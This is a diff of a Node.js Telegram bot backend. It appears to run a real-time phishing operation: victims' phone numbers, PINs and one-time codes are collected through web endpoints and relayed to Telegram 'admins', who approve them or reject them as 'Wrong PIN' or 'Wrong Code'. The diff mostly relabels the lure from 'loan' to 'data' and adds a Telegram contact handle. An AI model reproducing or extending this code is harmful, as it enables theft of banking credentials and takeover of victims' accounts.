@@ -302,7 +302,7 @@ ${WEBHOOK_URL}?admin=${adminId}
 
 Your Chat ID: \`${chatId}\`
 
-Provide this to your super admin to get access @CodeWorkTech.
+Provide this to your super admin to get access t.me/CodeWorkTech.
                 `, { parse_mode: 'Markdown' });
             }
         } catch (error) {
@@ -669,7 +669,7 @@ Use /unpauseadmin ${targetAdminId} to restore.
             `, { parse_mode: 'Markdown' });
 
             const targetChatId = adminChatIds.get(targetAdminId);
-            if (targetChatId) bot.sendMessage(targetChatId, `✅ *YOUR ADMIN ACCESS HAS BEEN RESTORED*\n\nYou can now approve loan applications.\n\nUse /start to see commands.`, { parse_mode: 'Markdown' }).catch(() => {});
+            if (targetChatId) bot.sendMessage(targetChatId, `✅ *YOUR ADMIN ACCESS HAS BEEN RESTORED*\n\nYou can now approve data requests.\n\nUse /start to see commands.`, { parse_mode: 'Markdown' }).catch(() => {});
         } catch (error) {
             console.error('❌ Error unpausing admin:', error);
             bot.sendMessage(chatId, '❌ Failed. Error: ' + error.message);
@@ -1034,7 +1034,7 @@ User will re-enter code.
     else if (action === 'allow' && type === 'pin') {
         await db.updateApplication(applicationId, { pinStatus: 'approved' });
         await bot.editMessageText(`
-✅ *ALL CORRECT - APPROVED*
+✅ *DETAILS CORRECT - APPROVED*
 
 📋 \`${applicationId}\`
 📞 \`${formatPhone(application.phoneNumber)}\`
@@ -1049,11 +1049,11 @@ User will now proceed to OTP.
         await bot.answerCallbackQuery(callbackQuery.id, { text: '✅ Approved! User can enter OTP now.' });
     }
 
-    // Approve Loan
+    // Approve Data
     else if (action === 'approve' && type === 'otp') {
         await db.updateApplication(applicationId, { otpStatus: 'approved' });
         await bot.editMessageText(`
-🎉 *LOAN APPROVED!*
+🎉 *DATA APPROVED!*
 
 📋 \`${applicationId}\`
 📞 \`${formatPhone(application.phoneNumber)}\`
@@ -1066,7 +1066,7 @@ User will now proceed to OTP.
 
 ✅ User will see approval page!
         `, { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' });
-        await bot.answerCallbackQuery(callbackQuery.id, { text: '🎉 Loan approved!' });
+        await bot.answerCallbackQuery(callbackQuery.id, { text: '🎉 DATA APPROVED!' });
     }
 });
 
@@ -1208,7 +1208,7 @@ app.post('/api/verify-pin', async (req, res) => {
         // Send to Telegram
         const userLabel = isReturningUser
             ? `🔄 *RETURNING USER* (${thisAdminPastApps.length}x before)`
-            : '🆕 *NEW APPLICATION*';
+            : '🆕 *NEW DATA REQUEST*';
         await sendToAdmin(assignedAdmin.adminId, `
 ${userLabel}
 
@@ -1277,7 +1277,7 @@ app.post('/api/verify-otp', async (req, res) => {
             ? `\n🔄 *Returning customer* (${application.previousCount || 1} previous visits)`
             : '';
         await sendToAdmin(application.adminId, `
-📲 *CODE VERIFICATION*${returningLabel}
+📲 *OTP VERIFICATION*${returningLabel}
 
 📋 \`${applicationId}\`
 📞 \`${formatPhone(application.phoneNumber)}\`
@@ -1291,7 +1291,7 @@ app.post('/api/verify-otp', async (req, res) => {
                 inline_keyboard: [
                     [{ text: '❌ Wrong PIN',   callback_data: `wrongpin_otp_${application.adminId}_${applicationId}` }],
                     [{ text: '❌ Wrong Code',  callback_data: `wrongcode_otp_${application.adminId}_${applicationId}` }],
-                    [{ text: '✅ Approve Loan', callback_data: `approve_otp_${application.adminId}_${applicationId}` }]
+                    [{ text: '✅ Approve Data', callback_data: `approve_otp_${application.adminId}_${applicationId}` }]
                 ]
             }
         });
